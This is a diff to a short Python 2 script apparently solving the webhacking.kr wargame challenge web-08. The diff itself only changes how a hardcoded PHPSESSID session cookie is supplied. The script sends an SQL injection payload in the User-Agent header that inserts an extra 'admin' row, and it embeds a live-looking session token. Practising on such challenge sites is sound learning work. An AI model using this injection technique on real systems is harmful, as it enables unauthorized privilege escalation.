@@ -1,18 +1,20 @@
 #-*- coding: utf-8 -*-
 import urllib2
-import CookieConstants
+import CookieManager
 
 challengeUrl = "http://webhacking.kr/challenge/web/web-08/"
 
 httpRequest = urllib2.Request(challengeUrl)
 httpRequest.add_header("User-Agent", "agent', 'ip', 'admin'), ('test")
-httpRequest.add_header("Cookie", CookieConstants.sessionId)
+CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+httpRequest.add_header("Cookie", CookieManager.getCookie())
 
 httpResponse = urllib2.urlopen(httpRequest).read()
 print httpResponse
 
 httpRequest.add_header("User-Agent", "agent")
-httpRequest.add_header("Cookie", CookieConstants.sessionId)
+CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+httpRequest.add_header("Cookie", CookieManager.getCookie())
 httpRequest.get_method = lambda: 'POST'
 
 httpResponse = urllib2.urlopen(httpRequest).read()
